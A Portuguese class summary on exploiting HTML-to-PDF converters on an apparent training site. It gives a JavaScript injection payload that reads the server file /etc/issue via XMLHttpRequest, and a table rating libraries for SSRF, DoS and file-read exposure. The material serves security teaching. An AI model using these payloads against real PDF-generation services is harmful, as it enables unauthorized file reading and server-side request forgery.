# Exploração de Vulnerabilidades em Conversores de HTML para PDF

## Visão Geral

Na primeira aula, acessamos o site [Relatório de Treinamento](https://relatorio.treinamento.info/) e analisamos suas vulnerabilidades. Identificamos que era possível modificar o código HTML enviado ao servidor, o qual gerava um PDF. Descobrimos que o servidor executava código JavaScript, o que nos permitiu explorar essa falha para executar scripts arbitrários no servidor.

## Exemplos de Payload

### Payload 1: Executando JavaScript no Servidor

```javascript
// Este exemplo demonstra como o JavaScript é executado no servidor
<p id="demo"></p>
<script>
const d = new Date();
document.getElementById("demo").innerHTML = d;
</script>
```

### Payload 2: Realizando Requisições para Arquivos Internos

```javascript
// Este payload usa XMLHttpRequest para acessar informações do sistema
<p id="demo"></p>
<script>
function reqListener() {
    document.getElementById("demo").innerHTML = this.responseText;
    console.log(this.responseText);
}
var oReq = new XMLHttpRequest();
oReq.onload = reqListener;
oReq.open("get", "/etc/issue", true);
oReq.send();
</script>
```

## Conversores de HTML para PDF Inseguros

Conforme [Side Channel Blog](https://www.sidechannel.blog/conversores-de-html-para-pdf-da-para-hackear/), vários conversores de HTML para PDF apresentam vulnerabilidades que podem ser exploradas. Abaixo está uma tabela resumindo alguns desses conversores mencionados no artigo:


| Biblioteca      | Permitir Javascript | Desabilitar Javascript | DoS (sleep) | DoS (loop) | SSRF  | Limite de Requisições | Leitura de Arquivos |
|-----------------|---------------------|------------------------|-------------|------------|-------|----------------------|---------------------|
| Flying Saucer   | false               | n/a                    | n/a         | n/a        | n/a   | n/a                  | n/a                 |
| WeasyPrint      | false               | n/a                    | n/a         | n/a        | n/a   | n/a                  | n/a                 |
| Node-HTML-PDF   | true                | false                  | true        | true       | true  | false                | true                |
| go-wkHTML       | true                | false                  | true        | true       | true  | false                | true                |
| DinkToPDF       | true                | false                  | true        | true       | true  | false                | true                |
| wkHTML          | true                | true                   | true        | true       | true  | false                | true                |
| PDFKit          | true                | false                  | true        | true       | true  | false                | true                |
| DomPDF          | false               | n/a                    | n/a         | n/a        | n/a   | n/a                  | n/a                 |


## Conclusão

Esta aula destacou a importância de entender e mitigar vulnerabilidades em aplicações que processam entrada de HTML para geração de PDFs. Exploramos técnicas práticas para testar e identificar pontos fracos em sistemas de processamento de HTML, o que é essencial para a segurança da informação.

---

Este resumo oferece uma visão clara do conteúdo tratado na aula, incluindo exemplos práticos de código e uma análise de ferramentas com vulnerabilidades conhecidas.